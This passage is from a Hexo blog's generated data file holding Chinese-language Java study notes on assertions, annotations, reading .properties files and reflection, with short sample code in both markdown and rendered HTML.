switch</h4><blockquote>\n<p>if else(){} 的空间效率高</p>\n</blockquote>\n<blockquote>\n<p>switch的时间效率高<br>==空间换时间==</p>\n</blockquote>\n<h4 id=\"3-param-new-Object-和param-null\"><a href=\"#3-param-new-Object-和param-null\" class=\"headerlink\" title=\"3.param = new Object()和param = null\"></a>3.param = new Object()和param = null</h4><blockquote>\n<p>param = new Object() 会初始化，真实存在</p>\n</blockquote>\n<blockquote>\n<p>param = null 参数为空，不存在</p>\n</blockquote>\n<h4 id=\"4-Variable-expected\"><a href=\"#4-Variable-expected\" class=\"headerlink\" title=\"4.Variable expected\"></a>4.Variable expected</h4><p><a href=\"http://stackoverflow.com/questions/31797631/variable-expected-error\" target=\"_blank\" rel=\"noopener\">Variable expected error</a></p>\n<p>map.get(key) = new Value();</p>\n<h4 id=\"5-assert\"><a href=\"#5-assert\" class=\"headerlink\" title=\"5.assert\"></a>5.assert</h4><p><a href=\"http://www.cnblogs.com/wardensky/p/4307848.html\" target=\"_blank\" rel=\"noopener\">assertion(断言)</a><br>assertion就是在程序中的一条语句，它对一个boolean表达式进行检查，一个正确程序必须保证这个boolean表达式的值为true；如果该值为false，说明程序已经处于不正确的状态下，系统将给出警告并且退出。</p>\n<p>用法：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. assert expression1;</span><br><span class=\"line\">2. assert expression1: expression2;</span><br></pre></td></tr></table></figure></p>\n<p>expression1表示一个boolean表达式，expression2表示一个基本类型、表达式或者是一个Object，用于在失败时输出错误信息。</p>\n<h4 id=\"6-Java修饰符\"><a href=\"#6-Java修饰符\" class=\"headerlink\" title=\"6.Java修饰符\"></a>6.Java修饰符</h4><p>public/private/protected</p>\n<h4 id=\"7-Java-集合类\"><a href=\"#7-Java-集合类\" class=\"headerlink\" title=\"7.Java 集合类\"></a>7.Java 集合类</h4><h4 id=\"8-Object-o-new-Object\"><a href=\"#8-Object-o-new-Object\" class=\"headerlink\" title=\"8. Object o = new Object()\"></a>8. Object o = new Object()</h4><p>o.toString()和（String）o的区别</p>\n<h4 id=\"9-Java枚举类\"><a href=\"#9-Java枚举类\" class=\"headerlink\" title=\"9.Java枚举类\"></a>9.Java枚举类</h4><p><a href=\"http://www.cnblogs.com/zhaoyanjun/p/5659811.html\" target=\"_blank\" rel=\"noopener\">lianjie</a></p>\n<h4 id=\"10-SuppressWarnings\"><a href=\"#10-SuppressWarnings\" class=\"headerlink\" title=\"10.@SuppressWarnings\"></a>10.@SuppressWarnings</h4><p>J2SE 提供的最后一个批注是 @SuppressWarnings。该批注的作用是给编译器一条指令，告诉它对被批注的代码元素内部的某些警告保持静默。<br>@SuppressWarnings 批注允许你选择性地取消特定代码段（即，类或方法）中的警告。其中的想法是当您看到警告时，您将调查它，如果你确定它不是问题，就可以添加一个 @SuppressWarnings 批注，以使您不会再看到警告。虽然它听起来似乎会屏蔽潜在的错误，但实际上它将提高代码安全性，因为它将防止对警告无动于衷 — 看到的每一个警告都将值得注意。<br><a href=\"https://zhidao.baidu.com/question/297231941.html\" target=\"_blank\" rel=\"noopener\">来自百度知道</a></p>\n<p><a href=\"http://blog.csdn.net/mddy2001/article/details/8291484\" target=\"_blank\" rel=\"noopener\">可屏蔽内容</a></p>\n"},{"title":"Accumulation","date":"2018-07-10T13:09:19.000Z","_content":"#### 读property文件\n[链接](http://shmilyaw-hotmail-com.iteye.com/blog/1899242)\n\n代码：\n```\npublic class IOExample {\n    public static void main(String[] args) {\n        Properties prop = new Properties();\n\n        try {\n            prop.load(new FileInputStream(\"input/config/database.properties\"));\n\n            System.out.println(prop.getProperty(\"oracle.output.url\"));\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n----------------------------------------------\npublic class NewApp {  \n    public static void main(String[] args) {  \n        Properties prop = new Properties();  \n          \n        try {  \n            prop.load(NewApp.class.getClassLoader().getResourceAsStream(\"config.properties\"));  \n              \n            System.out.println(prop.getProperty(\"database\"));  \n            System.out.println(prop.getProperty(\"dbuser\"));  \n            System.out.println(prop.getProperty(\"dbpassword\"));  \n        } catch(IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n}  \n```","source":"_posts/Java/Accumulation.md","raw":"---\ntitle: Accumulation\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n#### 读property文件\n[链接](http://shmilyaw-hotmail-com.iteye.com/blog/1899242)\n\n代码：\n```\npublic class IOExample {\n    public static void main(String[] args) {\n        Properties prop = new Properties();\n\n        try {\n            prop.load(new FileInputStream(\"input/config/database.properties\"));\n\n            System.out.println(prop.getProperty(\"oracle.output.url\"));\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n----------------------------------------------\npublic class NewApp {  \n    public static void main(String[] args) {  \n        Properties prop = new Properties();  \n          \n        try {  \n            prop.load(NewApp.class.getClassLoader().getResourceAsStream(\"config.properties\"));  \n              \n            System.out.println(prop.getProperty(\"database\"));  \n            System.out.println(prop.getProperty(\"dbuser\"));  \n            System.out.println(prop.getProperty(\"dbpassword\"));  \n        } catch(IOException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n}  \n```","slug":"Java/Accumulation","published":1,"updated":"2018-07-10T13:10:09.887Z","_id":"cjjedmh9h002k0gtjlnzgcz0g","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"读property文件\"><a href=\"#读property文件\" class=\"headerlink\" title=\"读property文件\"></a>读property文件</h4><p><a href=\"http://shmilyaw-hotmail-com.iteye.com/blog/1899242\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p>代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class IOExample &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        Properties prop = new Properties();</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            prop.load(new FileInputStream(&quot;input/config/database.properties&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;oracle.output.url&quot;));</span><br><span class=\"line\">        &#125; catch(IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">public class NewApp &#123;  </span><br><span class=\"line\">    public static void main(String[] args) &#123;  </span><br><span class=\"line\">        Properties prop = new Properties();  </span><br><span class=\"line\">          </span><br><span class=\"line\">        try &#123;  </span><br><span class=\"line\">            prop.load(NewApp.class.getClassLoader().getResourceAsStream(&quot;config.properties&quot;));  </span><br><span class=\"line\">              </span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;database&quot;));  </span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;dbuser&quot;));  </span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;dbpassword&quot;));  </span><br><span class=\"line\">        &#125; catch(IOException e) &#123;  </span><br><span class=\"line\">            e.printStackTrace();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"读property文件\"><a href=\"#读property文件\" class=\"headerlink\" title=\"读property文件\"></a>读property文件</h4><p><a href=\"http://shmilyaw-hotmail-com.iteye.com/blog/1899242\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<p>代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class IOExample &#123;</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        Properties prop = new Properties();</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            prop.load(new FileInputStream(&quot;input/config/database.properties&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;oracle.output.url&quot;));</span><br><span class=\"line\">        &#125; catch(IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">----------------------------------------------</span><br><span class=\"line\">public class NewApp &#123;  </span><br><span class=\"line\">    public static void main(String[] args) &#123;  </span><br><span class=\"line\">        Properties prop = new Properties();  </span><br><span class=\"line\">          </span><br><span class=\"line\">        try &#123;  </span><br><span class=\"line\">            prop.load(NewApp.class.getClassLoader().getResourceAsStream(&quot;config.properties&quot;));  </span><br><span class=\"line\">              </span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;database&quot;));  </span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;dbuser&quot;));  </span><br><span class=\"line\">            System.out.println(prop.getProperty(&quot;dbpassword&quot;));  </span><br><span class=\"line\">        &#125; catch(IOException e) &#123;  </span><br><span class=\"line\">            e.printStackTrace();  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"Java字符编码","date":"2018-07-10T13:09:19.000Z","_content":"[判断](http://blog.csdn.net/witsmakemen/article/details/8205211)","source":"_posts/Java/Java字符编码.md","raw":"---\ntitle: Java字符编码\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n[判断](http://blog.csdn.net/witsmakemen/article/details/8205211)","slug":"Java/Java字符编码","published":1,"updated":"2018-07-10T13:10:09.890Z","_id":"cjjedmh9h002n0gtjp3ho52dy","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://blog.csdn.net/witsmakemen/article/details/8205211\" target=\"_blank\" rel=\"noopener\">判断</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://blog.csdn.net/witsmakemen/article/details/8205211\" target=\"_blank\" rel=\"noopener\">判断</a></p>\n"},{"title":"Java反射","date":"2018-07-10T13:09:19.000Z","_content":"### 1. 反射\n正常情况下都是通过一个类去实例化一个对象，通过一个对象找到一个类的名称，地址，方法等类信息时用到的机制就是反射\n#### 一个简单的栗子：\n```\npackage com.learn.controller;\n\npublic class Fanshe {\n\n    public static void main(String[] args){\n        testFanshe ts = new testFanshe();\n        System.out.println(\n                ts.getClass().getName()\n        );\n    }\n\n}\nclass testFanshe{}\n```     \n运行结果如下：\n> com.learn.controller.testFanshe\n\n### 2. 反射原理\n- ##### Object类\n   object类是Java中所有类的父类。\n> 一切操作都是用Object类完成，类、数组的引用都可以使用Object类接收\n\nObject类的方法如下\n\n![image](C:\\Users\\hanqian18790\\Desktop\\object.png)\n- ##### Class类\n所有对象都是Class类的实例\n使用反射机制就要先获取Class类的实例\n\n实例化Class类的方法：\n\n1.对象.class\n\n2.对象.getClass()\n\n3.Class.forName(包名.类名)  ---------//更具灵活性，不用使用一个对象的实例只要知道类名和路径\n\n实例化Class类后就可以使用Class类中的方法进行反射操作了\n\n一些方法如下:\n\n![imge](C:\\Users\\hanqian18790\\Desktop\\getClass.png)\n\n### 3. 反射的应用\n\n#### 1).实例化Class后可以通过具体类的构造方法实例化一个具体对象\n```\npackage com.learn.controller;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class Fanshe {\n    public static void main(String[] args) throws \n            NoSuchMethodException, \n            IllegalAccessException, \n            InstantiationException, \n            InvocationTargetException {\n\n        Class<?> c = null;\n        try {\n            c = Class.forName(\"com.learn.controller.testFanshe\");\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        testFanshe TS0 = (testFanshe) c.newInstance();          //需要有无惨构造方法\n        Constructor<?>[] cons = c.getConstructors();            //返回所有构造方法\n        testFanshe TS1 = (testFanshe) cons[0].newInstance();    //newInstance()可以传入参数，如果有需要参数的构造方法的话\n\n    }\n\n}\n\nclass testFanshe {\n}\n```\n\n\n\n#### 2). 反射还可以：\n```\nClass<?>[] interfaces = c.getInterfaces();              //取得所有接口\nClass<?> superclass = c.getSuperclass();                //取得父类\nMethod[] methods = c.getMethods();                      //取得方法\nField[] fields = c.getFields();                         //取得全部属性\n```\n#### 3). 还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。","source":"_posts/Java/Java反射.md","raw":"---\ntitle: Java反射\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n### 1. 反射\n正常情况下都是通过一个类去实例化一个对象，通过一个对象找到一个类的名称，地址，方法等类信息时用到的机制就是反射\n#### 一个简单的栗子：\n```\npackage com.learn.controller;\n\npublic class Fanshe {\n\n    public static void main(String[] args){\n        testFanshe ts = new testFanshe();\n        System.out.println(\n                ts.getClass().getName()\n        );\n    }\n\n}\nclass testFanshe{}\n```     \n运行结果如下：\n> com.learn.controller.testFanshe\n\n### 2. 反射原理\n- ##### Object类\n   object类是Java中所有类的父类。\n> 一切操作都是用Object类完成，类、数组的引用都可以使用Object类接收\n\nObject类的方法如下\n\n![image](C:\\Users\\hanqian18790\\Desktop\\object.png)\n- ##### Class类\n所有对象都是Class类的实例\n使用反射机制就要先获取Class类的实例\n\n实例化Class类的方法：\n\n1.对象.class\n\n2.对象.getClass()\n\n3.Class.forName(包名.类名)  ---------//更具灵活性，不用使用一个对象的实例只要知道类名和路径\n\n实例化Class类后就可以使用Class类中的方法进行反射操作了\n\n一些方法如下:\n\n![imge](C:\\Users\\hanqian18790\\Desktop\\getClass.png)\n\n### 3. 反射的应用\n\n#### 1).实例化Class后可以通过具体类的构造方法实例化一个具体对象\n```\npackage com.learn.controller;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\n\npublic class Fanshe {\n    public static void main(String[] args) throws \n            NoSuchMethodException, \n            IllegalAccessException, \n            InstantiationException, \n            InvocationTargetException {\n\n        Class<?> c = null;\n        try {\n            c = Class.forName(\"com.learn.controller.testFanshe\");\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        testFanshe TS0 = (testFanshe) c.newInstance();          //需要有无惨构造方法\n        Constructor<?>[] cons = c.getConstructors();            //返回所有构造方法\n        testFanshe TS1 = (testFanshe) cons[0].newInstance();    //newInstance()可以传入参数，如果有需要参数的构造方法的话\n\n    }\n\n}\n\nclass testFanshe {\n}\n```\n\n\n\n#### 2). 反射还可以：\n```\nClass<?>[] interfaces = c.getInterfaces();              //取得所有接口\nClass<?> superclass = c.getSuperclass();                //取得父类\nMethod[] methods = c.getMethods();                      //取得方法\nField[] fields = c.getFields();                         //取得全部属性\n```\n#### 3). 还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。","slug":"Java/Java反射","published":1,"updated":"2018-07-10T13:10:09.888Z","_id":"cjjedmh9i002p0gtj3xu1sqyo","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1-反射\"><a href=\"#1-反射\" class=\"headerlink\" title=\"1. 反射\"></a>1. 反射</h3><p>正常情况下都是通过一个类去实例化一个对象，通过一个对象找到一个类的名称，地址，方法等类信息时用到的机制就是反射</p>\n<h4 id=\"一个简单的栗子：\"><a href=\"#一个简单的栗子：\" class=\"headerlink\" title=\"一个简单的栗子：\"></a>一个简单的栗子：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.learn.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Fanshe &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        testFanshe ts = new testFanshe();</span><br><span class=\"line\">        System.out.println(</span><br><span class=\"line\">                ts.getClass().getName()</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class testFanshe&#123;&#125;</span><br><span class=\"line\">```     </span><br><span class=\"line\">运行结果如下：</span><br><span class=\"line\">&gt; com.learn.controller.testFanshe</span><br><span class=\"line\"></span><br><span class=\"line\">### 2. 反射原理</span><br><span class=\"line\">- ##### Object类</span><br><span class=\"line\">   object类是Java中所有类的父类。</span><br><span class=\"line\">&gt; 一切操作都是用Object类完成，类、数组的引用都可以使用Object类接收</span><br><span class=\"line\"></span><br><span class=\"line\">Object类的方法如下</span><br><span class=\"line\"></span><br><span class=\"line\">![image](C:\\Users\\hanqian18790\\Desktop\\object.png)</span><br><span class=\"line\">- ##### Class类</span><br><span class=\"line\">所有对象都是Class类的实例</span><br><span class=\"line\">使用反射机制就要先获取Class类的实例</span><br><span class=\"line\"></span><br><span class=\"line\">实例化Class类的方法：</span><br><span class=\"line\"></span><br><span class=\"line\">1.对象.class</span><br><span class=\"line\"></span><br><span class=\"line\">2.对象.getClass()</span><br><span class=\"line\"></span><br><span class=\"line\">3.Class.forName(包名.类名)  ---------//更具灵活性，不用使用一个对象的实例只要知道类名和路径</span><br><span class=\"line\"></span><br><span class=\"line\">实例化Class类后就可以使用Class类中的方法进行反射操作了</span><br><span class=\"line\"></span><br><span class=\"line\">一些方法如下:</span><br><span class=\"line\"></span><br><span class=\"line\">![imge](C:\\Users\\hanqian18790\\Desktop\\getClass.png)</span><br><span class=\"line\"></span><br><span class=\"line\">### 3. 反射的应用</span><br><span class=\"line\"></span><br><span class=\"line\">#### 1).实例化Class后可以通过具体类的构造方法实例化一个具体对象</span><br></pre></td></tr></table></figure>\n<p>package com.learn.controller;</p>\n<p>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationTargetException;</p>\n<p>public class Fanshe {<br>    public static void main(String[] args) throws<br>            NoSuchMethodException,<br>            IllegalAccessException,<br>            InstantiationException,<br>            InvocationTargetException {</p>\n<pre><code>    Class&lt;?&gt; c = null;\n    try {\n        c = Class.forName(&quot;com.learn.controller.testFanshe&quot;);\n    } catch (ClassNotFoundException e) {\n        e.printStackTrace();\n    }\n    testFanshe TS0 = (testFanshe) c.newInstance();          //需要有无惨构造方法\n    Constructor&lt;?&gt;[] cons = c.getConstructors();            //返回所有构造方法\n    testFanshe TS1 = (testFanshe) cons[0].newInstance();    //newInstance()可以传入参数，如果有需要参数的构造方法的话\n\n}\n</code></pre><p>}</p>\n<p>class testFanshe {<br>}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### 2). 反射还可以：</span><br></pre></td></tr></table></figure></p>\n<p>Class&lt;?&gt;[] interfaces = c.getInterfaces();              //取得所有接口<br>Class&lt;?&gt; superclass = c.getSuperclass();                //取得父类<br>Method[] methods = c.getMethods();                      //取得方法<br>Field[] fields = c.getFields();                         //取得全部属性<br><code>`</code></p>\n<h4 id=\"3-还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。\"><a href=\"#3-还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。\" class=\"headerlink\" title=\"3). 还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。\"></a>3). 还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。</h4>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-反射\"><a href=\"#1-反射\" class=\"headerlink\" title=\"1. 反射\"></a>1. 反射</h3><p>正常情况下都是通过一个类去实例化一个对象，通过一个对象找到一个类的名称，地址，方法等类信息时用到的机制就是反射</p>\n<h4 id=\"一个简单的栗子：\"><a href=\"#一个简单的栗子：\" class=\"headerlink\" title=\"一个简单的栗子：\"></a>一个简单的栗子：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.learn.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Fanshe &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        testFanshe ts = new testFanshe();</span><br><span class=\"line\">        System.out.println(</span><br><span class=\"line\">                ts.getClass().getName()</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class testFanshe&#123;&#125;</span><br><span class=\"line\">```     </span><br><span class=\"line\">运行结果如下：</span><br><span class=\"line\">&gt; com.learn.controller.testFanshe</span><br><span class=\"line\"></span><br><span class=\"line\">### 2. 反射原理</span><br><span class=\"line\">- ##### Object类</span><br><span class=\"line\">   object类是Java中所有类的父类。</span><br><span class=\"line\">&gt; 一切操作都是用Object类完成，类、数组的引用都可以使用Object类接收</span><br><span class=\"line\"></span><br><span class=\"line\">Object类的方法如下</span><br><span class=\"line\"></span><br><span class=\"line\">![image](C:\\Users\\hanqian18790\\Desktop\\object.png)</span><br><span class=\"line\">- ##### Class类</span><br><span class=\"line\">所有对象都是Class类的实例</span><br><span class=\"line\">使用反射机制就要先获取Class类的实例</span><br><span class=\"line\"></span><br><span class=\"line\">实例化Class类的方法：</span><br><span class=\"line\"></span><br><span class=\"line\">1.对象.class</span><br><span class=\"line\"></span><br><span class=\"line\">2.对象.getClass()</span><br><span class=\"line\"></span><br><span class=\"line\">3.Class.forName(包名.类名)  ---------//更具灵活性，不用使用一个对象的实例只要知道类名和路径</span><br><span class=\"line\"></span><br><span class=\"line\">实例化Class类后就可以使用Class类中的方法进行反射操作了</span><br><span class=\"line\"></span><br><span class=\"line\">一些方法如下:</span><br><span class=\"line\"></span><br><span class=\"line\">![imge](C:\\Users\\hanqian18790\\Desktop\\getClass.png)</span><br><span class=\"line\"></span><br><span class=\"line\">### 3. 反射的应用</span><br><span class=\"line\"></span><br><span class=\"line\">#### 1).实例化Class后可以通过具体类的构造方法实例化一个具体对象</span><br></pre></td></tr></table></figure>\n<p>package com.learn.controller;</p>\n<p>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationTargetException;</p>\n<p>public class Fanshe {<br>    public static void main(String[] args) throws<br>            NoSuchMethodException,<br>            IllegalAccessException,<br>            InstantiationException,<br>            InvocationTargetException {</p>\n<pre><code>    Class&lt;?&gt; c = null;\n    try {\n        c = Class.forName(&quot;com.learn.controller.testFanshe&quot;);\n    } catch (ClassNotFoundException e) {\n        e.printStackTrace();\n    }\n    testFanshe TS0 = (testFanshe) c.newInstance();          //需要有无惨构造方法\n    Constructor&lt;?&gt;[] cons = c.getConstructors();            //返回所有构造方法\n    testFanshe TS1 = (testFanshe) cons[0].newInstance();    //newInstance()可以传入参数，如果有需要参数的构造方法的话\n\n}\n</code></pre><p>}</p>\n<p>class testFanshe {<br>}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### 2). 反射还可以：</span><br></pre></td></tr></table></figure></p>\n<p>Class&lt;?&gt;[] interfaces = c.getInterfaces();              //取得所有接口<br>Class&lt;?&gt; superclass = c.getSuperclass();                //取得父类<br>Method[] methods = c.getMethods();                      //取得方法<br>Field[] fields = c.getFields();                         //取得全部属性<br><code>`</code></p>\n<h4 id=\"3-还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。\"><a href=\"#3-还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。\" class=\"headerlink\" title=\"3). 还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。\"></a>3). 还可以获取类，接口，属性，方法的修饰符，入参，入参类型。。。</h4>"},{"title":"Java注解获取","date":"2018-07-10T13:09:19.000Z","_content":"### java 注解\n[注解见另一篇笔记](http://blog.csdn.net/boomhankers/article/details/70768349)\n\n##### 注解按保存范围阶段分类\n先看一个栗子,下面是一个自定义的注解:\n\n```\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.SOURCE)\npublic @interface myAnnotation {\n    String[] value();\n```\n@Retention()注解，表示这个自定义注解的保存范围\n\n@Retention(RetentionPolicy.SOURCE)表示保存在源文件中\n\n分类：\n- ==*SOURCE*==:   此注解只会保存在源文件中，也就是.java文件，编译之后不会存在编译好的.class文件中\n- *==CLASS==*:  默认范围 此注解会保留在源文件和编译后的文件中，但不会被加载到虚拟机中\n- *==RUNTIME==*: 会保留在源文件和编译之后的文件中，运行时会被加载到JVM虚拟机中\n\n\n### 获取注解\n\n##### 某一个类中的注解\n先通过反射机制获取类，然后获取指定的方法和方法的注解.\n\n*这种方法要获取的注解一定要是运行时注解*\n```\npackage com.learn.controller;\n\nimport java.lang.annotation.Annotation;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Method;\n\nimport static java.lang.annotation.ElementType.*;\n\n@Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Myanno {\n    String value();\n}\n\nclass Myanotaion {\n    @Myanno(\"a method\")\n    @Override\n    public String toString(){\n        return \"llalal\";\n    }\n}\nclass GetAnno{\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException {\n        Class<?> c = Class.forName(\"com.learn.controller.Myanotaion\");\n        Method methods = c.getMethod(\"toString\");\n        Annotation annos[] = methods.getAnnotations();\n        Annotation myanno = methods.getAnnotation(Myanno.class);\n        